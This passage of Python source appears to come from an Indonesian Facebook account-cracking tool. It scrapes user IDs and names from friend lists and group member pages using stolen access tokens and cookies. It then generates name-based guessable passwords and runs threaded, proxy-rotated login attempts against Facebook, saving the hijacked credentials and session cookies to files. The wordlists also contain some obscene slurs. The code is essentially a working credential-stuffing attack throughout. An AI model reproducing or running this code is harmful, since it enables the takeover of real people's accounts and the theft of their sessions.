ganteng','lakarsantri','surabaya','joyoboyo','jakarta','kalimantan','ngawi','karina','kartika','kadek','kania','kaniya','kartini','kasih','kamala','kamila','karomah','karisa','karsih','katrina','keira','khaira','khaila','khafifah','khadijah','khairun','khairunisa','khalifah','khatimah','khopipah','kiki','kim','kila','kira','kirani','komarudin','kumala','kumalasari','kokom','komala','komalasari','kontol','kotima','kotimah','kulsum','kultsum','kuntul','kurnia','kurniati','kurniyati','kursina','kurniasih','kusmiati','kusmiyai','laela','lala','laila','lati','laty','latifah','lathifah','layla','laras','larasati','lasmini','laura','laudia','laudya','lela','lesmana','lena','leni','leny','lestari','lestary','lesti','lesty','levita','lia','lida','lidia','lidya','liana','liani','lilis','lina','linda','lintang','lis','lisa','lisha','lisna','lisnawati','lisnawaty','listi','listy','listia','listya','liza','liya','liyani','liza','lomrah','lulu','luna','lusi','lusy','luvita','lyna','lysa','mae','maemunah','maesarah','maesaroh','mala','maida','maidah','maira','maisa','maisha','malika','maimunah','magfirah','mahalini','maharani','maharini','mahda','mahmud','manda','mandha','maria','mardiah','mardianti','mardiyanti','mardyah','mardiyah','mariah','mariam','mariyah','maryati','mariati','mariyati','markonah','mariyam','marisa','marissa','martina','martinah','martini','maryamah','marwah','maryanti','marwati', 'marwaty','marzia']))}@gmail.com",
                    f"{nama}{str(random.choice(['official','gaming','cantik','ganteng','cool','gamz','arip','aripin','fajar','nanda','riski','yanti','aldo','aldi','aril','reno','caca','cici','turis','riska','dimbrut','gendut','akbar','dada','sayang','cinta','septi','septia','putriani','putri','sahrul','bahrul','ulum','kafa','kafabih','firkam','rifki','rifkia','rifkiani','sugik','ois','bunda','fatimah','zahra','tutik','kucing','malang','lamongan','yuda','ardian','dian','12','123','1234','12345','123456','official','gaming','cantik','ganteng','cool','gamz','arip','aripin','fajar','nanda','riski','yanti','aldo','aldi','aril','reno','caca','cici','turis','riska','dimbrut','gendut','akbar','dada','sayang','cinta','septi','septia','putriani','putri','sahrul','bahrul','ulum','kafa','kafabih','firkam','rifki','rifkia','rifkiani','sugik','ois','bunda','fatimah','zahra','tutik','kucing','malang','lamongan','yuda','ardian','dian','amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun','official','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri','rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','jepara','magelang','karanganyar','nganjuk','kediri','madiun','caruban','saradan','indonesia','cantik','gaming','ganteng','lakarsantri','surabaya','joyoboyo','jakarta','kalimantan','ngawi','karina','kartika','kadek','kania','kaniya','kartini','kasih','kamala','kamila','karomah','karisa','karsih','katrina','keira','khaira','khaila','khafifah','khadijah','khairun','khairunisa','khalifah','khatimah','khopipah','kiki','kim','kila','kira','kirani','komarudin','kumala','kumalasari','kokom','komala','komalasari','kontol','kotima','kotimah','kulsum','kultsum','kuntul','kurnia','kurniati','kurniyati','kursina','kurniasih','kusmiati','kusmiyai','laela','lala','laila','lati','laty','latifah','lathifah','layla','laras','larasati','lasmini','laura','laudia','laudya','lela','lesmana','lena','leni','leny','lestari','lestary','lesti','lesty','levita','lia','lida','lidia','lidya','liana','liani','lilis','lina','linda','lintang','lis','lisa','lisha','lisna','lisnawati','lisnawaty','listi','listy','listia','listya','liza','liya','liyani','liza','lomrah','lulu','luna','lusi','lusy','luvita','lyna','lysa','mae','maemunah','maesarah','maesaroh','mala','maida','maidah','maira','maisa','maisha','malika','maimunah','magfirah','mahalini','maharani','maharini','mahda','mahmud','manda','mandha','maria','mardiah','mardianti','mardiyanti','mardyah','mardiyah','mariah','mariam','mariyah','maryati','mariati','mariyati','markonah','mariyam','marisa','marissa','martina','martinah','martini','maryamah','marwah','maryanti','marwati', 'marwaty','marzia']))}@gmail.com"
                ])
                if dumping not in dump: dump.append(dumping+'<=>'+nama)
                Console().print(f"[grey50]   ╰─> Dump [green]@{str(dumping)[:20]}[grey50]/[blue]{len(dump)} [grey50]Email [green]Facebook     ", end='\r')
            if int(len(dump)) == limited: return(int(limited))
        return dump
                
    def Dump_ID_Facebook(self, username, cookies, token_eaab, fields):
        with requests.Session() as r:
            try:
                if len(dump) == 0: params = {"access_token": token_eaab,"fields": f"name,friends.fields(id,name,birthday)"}
                else: params = {"access_token": token_eaab,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
                response = r.get(f"https://graph.facebook.com/{username}", params=params,headers={"connection": "keep-alive","accept": "*/*","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"},cookies={'cookie':cookies}).json()
                for i in response["friends"]["data"]:
                    uid, nama = i["id"],i["name"]
                    if uid+'<=>'+nama not in dump:
                        dump.append(uid+'<=>'+nama)
                        Console().print(f"[grey50]   ╰─> Dump [green]@{str(i['id'])[:20]}[grey50]/[blue]{len(dump)} [grey50]User ID [green]Facebook     ", end='\r')
                fields = response["friends"]["paging"]["cursors"]["after"]
                self.Dump_ID_Facebook(username, cookies, token_eaab, fields)
            except (AttributeError, KeyboardInterrupt) as e: pass        
            
    def Dump_Member_Group(self, username, cookies, cursor):
        with requests.Session() as r:
            try:
                r.headers.update({**Require().Headers(),
                    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace',
                    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/128.0.0.0 Safari/537.36',
                    'viewport-width':'924'
                })
                response = r.get(f'https://www.facebook.com/groups/{username}/members', cookies = {'cookie': cookies}, allow_redirects=True).text
                self.payload = {**Require().Payload(response),
                    'fb_api_req_friendly_name': 'GroupsCometMembersPageNewMembersSectionRefetchQuery',
                    'server_timestamps':True,
                    'doc_id':'6621621524622624',
                    'variables':json.dumps({"count":10,"cursor":cursor,"groupID": re.search('"groupID":"(.*?)"',str(response)).group(1),"recruitingGroupFilterNonCompliant":False,"scale":1.5,"id": re.search('"groupID":"(.*?)"',str(response)).group(1)})
                }
                response2 = r.post('https://www.facebook.com/api/graphql/', data = self.payload, cookies={'cookie': cookies}).json()
                for i in response2['data']['node']['new_members']['edges']:
                    uid, nama = i['node']['id'], i['node']['name']
                    if uid+'<=>'+nama not in dump:
                        dump.append(uid+'<=>'+nama)
                        Console().print(f"[grey50]   ╰─> Dump [green]@{str(i['node']['id'])[:20]}[grey50]/[blue]{len(dump)} [grey50]User ID [green]Group    ", end='\r')
                if response2['data']['node']['new_members']['page_info']['has_next_page']:
                    cursor = response2['data']['node']['new_members']['page_info']['end_cursor']
                    self.Dump_Member_Group(username, cookies, cursor)
            except (AttributeError, KeyboardInterrupt) as e: pass     
        
    def Kalender(self):
        struct_time = time.localtime(time.time())
        return (
            time.strftime('%d', struct_time),
            time.strftime('%B', struct_time),
            time.strftime('%Y', struct_time)
        )
        
    def Simpan_Result(self):
        tanggal, bulan, tahun = self.Kalender()
        return(f'{tanggal}-{bulan}-{tahun}')
        
    def TypeMethod(self):
        try:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Rekomendasi Method Crack Dari Admin Yaitu : [green]Web Locale 2024[grey50], Untuk Method Lain Bisa Di Coba Sendiri Dan Untuk Rekomendasi Provider Yang Bagus Buat Crack Yaitu : [blue]Indosat [grey50]Dan [blue]Telkomsel[grey50], Untuk Provider Lain Bisa Di Coba Sendiri", title = f"[white]• [green]Catatan [white]•", subtitle=f'[italic grey50]• Dump : [green]{str(len(dump))} [white]•', subtitle_align = "left"))
            Console(width=65).print(Panel('[green]01[grey50]. Validate Locale 2024\t [green]02[grey50]. Web Locale 2024',style=f"{style_terminal}",subtitle = "╭─────", subtitle_align = "left"))
            self.TypePassword(Console().input("[grey50]   ╰─> "))
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()  
            
    def TypePassword(self, Type_Method):
        try:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Rekomendasi Password Crack Dari Admin Yaitu : [green]Fullname, Nama 1-5[grey50] Dan [green]Fullname, Nama 1-5 + M[grey50], Untuk Password Lain Bisa Di Coba Sendiri", title = f"[white]• [green]Catatan [white]•"))
            Console().print(Columns([Panel('[green]01[grey50]. Fullname, Nama 1-3\n[green]02[grey50]. Fullname, Nama 1-4', width=32, style = f"{style_terminal}", subtitle = "╭─────", subtitle_align = "left"), Panel('[green]03[grey50]. Fullname, Nama 1-5\n[green]04[grey50]. Fullname, Nama 1-6 + M', width=32, style = f"{style_terminal}")]))          
            self.ExcutorMethod(Type_Method, Console().input("[grey50]   ╰─> "))
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit() 
            
    def Password(self, name, kombinasi):
        self.password = []
        for nama in name.split(' '):
            if len(nama) < 3:
                continue
            else:
                if kombinasi in ('01') or kombinasi in ('1'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123']
                elif kombinasi in ('02') or kombinasi in ('2'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234']
                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                else: komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                for passwords in komb:
                    if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                        continue
                    else:
                        self.password.append(f'{str(passwords).lower()}')
        for passwords in [f'{name}', f'{name.replace(" ", "")}']:
            if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                continue
            else:
                self.password.append(f'{str(passwords).lower()}')
        return (self.password)
            
    def ExcutorMethod(self, Type_Method, Password_Akun):
        self.tambahan = []
        if Password_Akun in ('04') or Password_Akun in ('4'):
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan Password Tambahan, Misalnya : [green]kamu nanya,wonogiri[grey50] Tanpa Spasi Dan Banyaknya Password Gunakan Pemisah Koma", title = f"[white]• [green]Catatan [white]•"))
            tambahan = Console().input("[grey50]   ╰─> ")
            for tamb in tambahan.split(','):
                self.tambahan.append(f'{tamb}')      
        self.save_result = self.Simpan_Result()
        Console(width = 65, style = f"{style_terminal}").print(Panel(f'\
[grey50]Result OK tersimpan di : OK/OK-Facebook-{self.save_result}\nResult Cp tersimpan di : CP/CP-Facebook-{self.save_result}\n\
    - Mainkan Mode Pesawat 5 Detik Setiap 200 Loop -', title = f"[white]• [green]Save Result [white]•"))
        with ThreadPoolExecutor(max_workers=30) as V:
            for Username_And_Fullname in dump:
                username, fullname = Username_And_Fullname.split('<=>')
                if Password_Akun in ('04') or Password_Akun in ('4'):
                    password = self.Password(fullname, Password_Akun) + self.tambahan
                else: password = self.Password(fullname, Password_Akun) + self.tambahan
                if Type_Method in ('1') or Type_Method in ('01'): 
                    V.submit(
                        self.Exec_Validate_Recovery, username, password
                    ) 
                elif Type_Method in ('2') or Type_Method in ('02'): 
                    V.submit(
                        self.Exec_Asyinc_Recovery, username, password
                    )
                else: V.submit(self.Exec_Asyinc_Recovery, username, password)               
        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Kamu Telah Mendapatkan [green]{self.success}[grey50] Hasil [green]Success[grey50], Dan [red]{self.chekpoint}[grey50] Hasil [red]Checkpoint[grey50] Dari [blue]{len(dump)}[grey50] ID, Semua Hasil Tersimpan Di Result!", title = "[white]• [green]Selesai [white]•"))
        exit()
        
    def Exec_Validate_Recovery(self, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]   ──> ([green]{str(username)[:15]}[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Success[grey50]:[green]{self.success}[grey50]/[red]Chek[grey50]:[red]{self.chekpoint}[grey50])", end='\r')
        ua_generate = Useragent().useragent_facebook()
        while True:
            try:
                headersGet = {
                    'accept-language': 'en-US,id-ID,id;q=0.9',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'cache-control': 'max-age=0',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'sec-ch-ua': '"Not)A;Brand";v="{}", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1)),
                    'user-agent': ua_generate
                }
                response = byps.get('https://web.facebook.com/login/?', headers = headersGet).text
                payload = {
		    		'jazoest':re.search('name="jazoest" value="(.*?)"',str(response)).group(1),
		    		'lsd':re.search('name="lsd" value="(.*?)"',str(response)).group(1),
                    'timezone': '-420',
                    'lgndim': '',
		    		'login': '1',
                    'persistent': '1',
                    'default_persistent': '',
                    'login':'Masuk'
	        	}
                headersPost = {
                    'host': 'web.facebook.com',
                    'origin': 'https://web.facebook.com/',
                    'referer': 'https://web.facebook.com/login/?',
                    'accept-language': 'en-US,id-ID,id;q=0.9',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'cache-control': 'max-age=0',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua_generate,
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1)),
                    'accept-encoding': 'gzip, deflate',
                    'content-type': 'application/x-www-form-urlencoded',
                    'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in payload.items() ]))),
                    'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(re.search('"_js_datr","(.*?)"', str(response)).group(1)),
                    'view-width': str(random.randint(1311,1499))
                }
                break
            except (requests.exceptions.ConnectionError) as e: time.sleep(5); self.Exec_Validate_Recovery(username, password)
            except (Exception) as e: pass
        for passwd in password:
            try:
                payload.update({'email': username, 'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],passwd)})
                try:
                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/Zoraa-Dev/Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                response2 = byps.post('https://web.facebook.com/login/?email='+str(username)+'&locale=jv_ID&_rdr', headers = headersPost, data = payload, proxies = proxy, allow_redirects = True)
                self.save_result = self.Simpan_Result()
                if 'c_user' in byps.cookies.get_dict().keys():
                    self.success+=1
                    try: cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                    except (Exception) as e: cookies = ('Cookies tidak di temukan')
                    try: username = re.findall('c_user=(\d+)', cookies)[0]
                    except (Exception) as e: username = username
                    try:
                        Requ().Bahasa(cookies); Require().Active(cookies); Require().Inactive(cookies); Require().Deleted(cookies)
                        tree = Tree('\r                                             ')
                        tree = tree.add('\r╭ [italic green]Response success')
                        tree.add(f'[italic white]User ID [green]{username}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        true = tree.add('[italic green]Aplikasi Aktif')
                        if len(aplikasi_akt)==0: true.add('[italic green]tidak ada aplikasi terkait active')
                        else:
                            for aplikasi in aplikasi_akt: true.add(f"{aplikasi}")
                        true = tree.add('[italic yellow]Aplikasi Kedaluarsa')
                        if len(aplikasi_exp)==0: true.add('[italic yellow]tidak ada aplikasi terkait inactive')
                        else:
                            for aplikasi in aplikasi_exp: true.add(f"{aplikasi}")
                        true = tree.add('[italic red]Aplikasi Di Hapus')
                        if len(aplikasi_dld)==0: true.add('[italic red]tidak ada aplikasi terkait deleted')
                        else:
                            for aplikasi in aplikasi_dld: true.add(f"{aplikasi}")
                        tree.add(f'[italic white]Cookies [green]{cookies}')
                        tree.add(f'[italic white]Useragent [green]{headersPost["user-agent"]}')
                        printz(tree) 
                    except (Exception) as e:
                        print(e)
                        tree = Tree('\r                                             ')
                        tree = tree.add('\r╭ [italic green]Response success')
                        tree.add(f'[italic white]User ID [green]{username}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        tree.add(f'[italic white]Cookies [green]{cookies}')
                        tree.add(f'[italic white]Useragent [green]{headersPost["user-agent"]}')
                        printz(tree)
                    save = (f'{username}|{passwd}|{cookies}\n')
                    with open('/sdcard/OK/OK-Facebook-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break             
                elif 'checkpoint' in byps.cookies.get_dict().keys():
                    try: username = byps.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    except (Exception) as e: username = username
                    tree = Tree('\r                                             ')
                    tree = tree.add('\r╭ [italic red]Response chekpoint')
                    tree.add(f'[italic white]User ID [red]{username}')
                    tree.add(f'[italic white]Password [red]{passwd}')
                    tree.add(f'[italic white]Useragent [red]{headersPost["user-agent"]}')
                    printz(tree)
                    save = (f'{username}|{passwd}\n')
                    self.chekpoint+=1
                    with open('/sdcard/CP/CP-Facebook-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e: Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)   
        self.looping+=1  
        
    def Exec_Asyinc_Recovery(self, username, password):
        byps = requests.Session()
        Console().print(f"[grey50]   ──> ([green]{str(username)[:15]}[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Success[grey50]:[green]{self.success}[grey50]/[red]Chek[grey50]:[red]{self.chekpoint}[grey50])", end='\r')
        ua_generate = Useragent().useragent_facebook()
        while True:
            try:
                headersGet = {
                    'accept-language': 'en-US,id-ID,id;q=0.9',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'cache-control': 'max-age=0',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'sec-ch-ua': '"Not)A;Brand";v="{}", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1)),
                    'user-agent': ua_generate
                }
                response = byps.get('https://web.facebook.com/login/?', headers = headersGet).text
                payload = {
		    		'jazoest': re.search('name="jazoest" value="(.*?)"',str(response)).group(1),
		    		'lsd':re.search('name="lsd" value="(.*?)"',str(response)).group(1),
                    'timezone': '-420',
                    'lgndim': '',
		    		'login': '1',
                    'persistent': '1',
                    'default_persistent': '',
                    'login':'Masuk'
	        	}
                headersPost = {
                    'host': 'web.facebook.com',
                    'origin': 'https://web.facebook.com/',
                    'referer': 'https://web.facebook.com/?',
                    'accept-language': 'en-US,id-ID,id;q=0.9',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'cache-control': 'max-age=0',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua_generate,
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1)),
                    'accept-encoding': 'gzip, deflate',
                    'content-type': 'application/x-www-form-urlencoded',
                    'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in payload.items() ]))),
                    'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(re.search('"_js_datr","(.*?)"', str(response)).group(1)),
                    'view-width': str(random.randint(1311,1499))
                }
                break
            except (requests.exceptions.ConnectionError) as e: time.sleep(5); self.Exec_Asyinc_Recovery(username, password)
            except (Exception) as e: pass
        for passwd in password:
            try:
                payload.update({'email': username, 'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],passwd)})
                try:
                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/Zoraa-Dev/Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                response2 = byps.post('https://web.facebook.com/login/?locale=jv_ID&_rdr', data = payload, headers = headersPost, proxies = proxy, allow_redirects = True)
                self.save_result = self.Simpan_Result()
                if 'c_user' in byps.cookies.get_dict().keys():
                    self.success+=1
                    try: cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                    except (Exception) as e: cookies = ('Cookies tidak di temukan')
                    try: username = re.findall('c_user=(\d+)', cookies)[0]
                    except (Exception) as e: username = username
                    try:
                        Requ().Bahasa(cookies); Require().Active(cookies); Require().Inactive(cookies); Require().Deleted(cookies)
                        tree = Tree('\r                                             ')
                        tree = tree.add('\r╭ [italic green]Response success')
                        tree.add(f'[italic white]User ID [green]{username}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        true = tree.add('[italic green]Aplikasi Aktif')
                        if len(aplikasi_akt)==0: true.add('[italic green]tidak ada aplikasi terkait active')
                        else:
                            for aplikasi in aplikasi_akt: true.add(f"{aplikasi}")
                        true = tree.add('[italic yellow]Aplikasi Kedaluarsa')
                        if len(aplikasi_exp)==0: true.add('[italic yellow]tidak ada aplikasi terkait inactive')
                        else:
                            for aplikasi in aplikasi_exp: true.add(f"{aplikasi}")
                        true = tree.add('[italic red]Aplikasi Di Hapus')
                        if len(aplikasi_dld)==0: true.add('[italic red]tidak ada aplikasi terkait deleted')
                        else:
                            for aplikasi in aplikasi_dld: true.add(f"{aplikasi}")
                        tree.add(f'[italic white]Cookies [green]{cookies}')
                        tree.add(f'[italic white]Useragent [green]{headersPost["user-agent"]}')
                        printz(tree) 
                    except (Exception) as e:
                        print(e)
                        tree = Tree('\r                                             ')
                        tree = tree.add('\r╭ [italic green]Response success')
                        tree.add(f'[italic white]User ID [green]{username}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        tree.add(f'[italic white]Cookies [green]{cookies}')
                        tree.add(f'[italic white]Useragent [green]{headersPost["user-agent"]}')
                        printz(tree)
                    save = (f'{username}|{passwd}|{cookies}\n')
                    with open('/sdcard/OK/OK-Facebook-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break             
                elif 'checkpoint' in byps.cookies.get_dict().keys():
                    try: username = byps.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    except (Exception) as e: username = username
                    tree = Tree('\r                                             ')
                    tree = tree.add('\r╭ [italic red]Response chekpoint')
                    tree.add(f'[italic white]User ID [red]{username}')
                    tree.add(f'[italic white]Password [red]{passwd}')
                    tree.add(f'[italic white]Useragent [red]{headersPost["user-agent"]}')
                    printz(tree)
                    save = (f'{username}|{passwd}\n')
                    self.chekpoint+=1
                    with open('/sdcard/CP/CP-Facebook-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e: Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)   
        self.looping+=1  
        